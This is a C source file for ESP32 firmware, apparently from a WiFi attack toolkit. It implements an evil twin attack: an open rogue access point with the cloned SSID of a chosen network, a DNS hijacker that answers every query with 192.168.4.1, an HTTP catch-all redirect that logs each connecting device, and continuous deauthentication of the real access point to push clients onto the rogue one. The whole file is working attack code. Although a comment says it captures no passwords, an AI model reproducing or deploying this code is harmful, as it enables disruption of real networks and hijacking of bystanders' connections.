#include "hackk/attack_eviltwin.h"
#include "hackk/attack_dos.h"
#include "hackk/ui_status.h"
#include "hackk/hydra_config.h"
#include "hackk/management_helper.h"
#include "hackk/wifi_controller.h"
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "mdns.h"

static const char *TAG = "attack_eviltwin";

// ── State ──────────────────────────────────────────────────────
static volatile bool     s_running       = false;
static TaskHandle_t      s_task_handle   = NULL;
static httpd_handle_t    s_http_server   = NULL;
static int               s_dns_sock      = -1;
static TaskHandle_t      s_dns_task      = NULL;

static uint8_t  s_target_bssid[6]   = {0};
static uint8_t  s_target_channel     = 1;
static char     s_target_ssid[33]    = {0};

// ── DNS Hijack (answers every A-record with 192.168.4.1) ───────
#define DNS_PORT 53

static void dns_hijack_task(void *arg)
{
    struct sockaddr_in server_addr = {0};
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(DNS_PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    s_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s_dns_sock < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        vTaskDelete(NULL);
        return;
    }

    if (bind(s_dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed");
        close(s_dns_sock);
        s_dns_sock = -1;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "DNS hijack listening on :53");

    uint8_t buf[512];
    struct sockaddr_in client;
    socklen_t client_len = sizeof(client);

    while (s_running) {
        int len = recvfrom(s_dns_sock, buf, sizeof(buf), 0,
                           (struct sockaddr *)&client, &client_len);
        if (len < 12) continue;

        // Build a minimal DNS response: same transaction ID,
        // one answer record pointing to 192.168.4.1
        uint8_t resp[512];
        memcpy(resp, buf, 12);           // copy header
        resp[2] |= 0x80;                 // QR = response
        resp[3] = 0x00;                  // no error
        resp[6] = 0x00; resp[7] = 0x01;  // 1 answer
        resp[8] = 0x00; resp[9] = 0x00;  // 0 authority
        resp[10] = 0x00; resp[11] = 0x00;

        // Append a fixed answer: name pointer to 0x0C (question name),
        // type A, class IN, TTL 60, length 4, address 192.168.4.1
        const uint8_t answer[] = {
            0xC0, 0x0C,              // name pointer
            0x00, 0x01,              // type A
            0x00, 0x01,              // class IN
            0x00, 0x00, 0x00, 0x3C,  // TTL 60
            0x00, 0x04,              // data length
            192, 168, 4, 1           // IP
        };
        memcpy(resp + 12, answer, sizeof(answer));

        sendto(s_dns_sock, resp, 12 + sizeof(answer), 0,
               (struct sockaddr *)&client, client_len);
    }

    close(s_dns_sock);
    s_dns_sock = -1;
    vTaskDelete(NULL);
}

// ── HTTP handlers (NO form, NO password capture) ───────────────
static esp_err_t root_handler(httpd_req_t *req)
{
    // Log every connected device
    ui_event_t ev = { .type = EVT_LOG };
    snprintf(ev.line, sizeof(ev.line), "Device connected: %s",
             req->uri);
    ui_status_publish(&ev);

    // Redirect to the same URL so the OS thinks the portal is alive
    const char *redirect = "http://192.168.4.1/";
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", redirect);
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// Catch-all: every request that isn't root gets the same redirect.
static esp_err_t catchall_handler(httpd_req_t *req)
{
    ui_event_t ev = { .type = EVT_LOG };
    snprintf(ev.line, sizeof(ev.line), "Portal hit: %s", req->uri);
    ui_status_publish(&ev);

    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static httpd_handle_t start_portal(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.max_uri_handlers = 4;

    httpd_handle_t server = NULL;
    if (httpd_start(&server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "HTTP server start failed");
        return NULL;
    }

    httpd_uri_t root = {
        .uri      = "/",
        .method   = HTTP_GET,
        .handler  = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(server, &root);

    httpd_uri_t catchall = {
        .uri      = "/*",
        .method   = HTTP_GET,
        .handler  = catchall_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(server, &catchall);

    return server;
}

// ── Evil Twin task ─────────────────────────────────────────────
static void eviltwin_task(void *arg)
{
    ESP_LOGI(TAG, "Evil Twin started — SSID \"%s\" ch %u",
             s_target_ssid, s_target_channel);

    // 1. Start the rogue AP using the target SSID
    wifi_config_t ap_config = {0};
    strncpy((char *)ap_config.ap.ssid, s_target_ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len       = strlen(s_target_ssid);
    ap_config.ap.channel        = s_target_channel;
    ap_config.ap.authmode       = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 8;
    ap_config.ap.beacon_interval = 100;

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_set_channel(s_target_channel, WIFI_SECOND_CHAN_NONE));

    // 2. Start HTTP portal + DNS hijack
    s_http_server = start_portal();
    xTaskCreate(dns_hijack_task, "dns_hijack", 8192, NULL, 4, &s_dns_task);

    // 3. Continuously deauth the real AP so clients are pushed to us
    attack_dos_start_by_bssid(s_target_bssid, s_target_channel);

    // 4. Run for EVILTWIN_RUN_SECONDS, or until s_running flips false
    uint32_t start = esp_log_timestamp() / 1000;
    while (s_running) {
        uint32_t now = esp_log_timestamp() / 1000;
        if ((now - start) >= EVILTWIN_RUN_SECONDS) {
            ESP_LOGI(TAG, "Evil Twin timeout reached");
            break;
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    // 5. Tear down
    attack_dos_stop();

    if (s_dns_sock >= 0) {
        close(s_dns_sock);
        s_dns_sock = -1;
    }
    if (s_dns_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        s_dns_task = NULL;
    }
    if (s_http_server) {
        httpd_stop(s_http_server);
        s_http_server = NULL;
    }

    // 6. Restore the normal management AP
    management_helper_restore_ap();

    s_running = false;

    ui_event_t ev = { .type = EVT_EVILTWIN_STOPPED };
    snprintf(ev.line, sizeof(ev.line), "Evil Twin stopped");
    ui_status_publish(&ev);

    ESP_LOGI(TAG, "Evil Twin task exiting");
    s_task_handle = NULL;
    vTaskDelete(NULL);
}

// ── Public API ─────────────────────────────────────────────────
bool attack_eviltwin_start(int ap_index)
{
    if (s_running) return false;

    wifi_ap_record_t record = {0};
    if (!wifi_controller_get_ap(ap_index, &record)) {
        ESP_LOGE(TAG, "AP index %d not found", ap_index);
        return false;
    }

    memcpy(s_target_bssid, record.bssid, 6);
    s_target_channel = record.primary;
    strncpy(s_target_ssid, (char *)record.ssid, sizeof(s_target_ssid) - 1);

    // Stop the management AP so the radio is free for the rogue AP
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_start();

    s_running = true;
    xTaskCreate(eviltwin_task, "eviltwin_task", 8192, NULL, 5, &s_task_handle);

    ui_event_t ev = { .type = EVT_EVILTWIN_STARTED };
    snprintf(ev.line, sizeof(ev.line), "Evil Twin: %s", s_target_ssid);
    ui_status_publish(&ev);

    return true;
}

void attack_eviltwin_stop(void)
{
    if (!s_running) return;
    s_running = false;

    // The task will handle its own cleanup. Wait up to 5 s.
    for (int i = 0; i < 50 && s_task_handle; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ESP_LOGI(TAG, "Evil Twin stopped");
}

bool attack_eviltwin_is_running(void) { return s_running; }
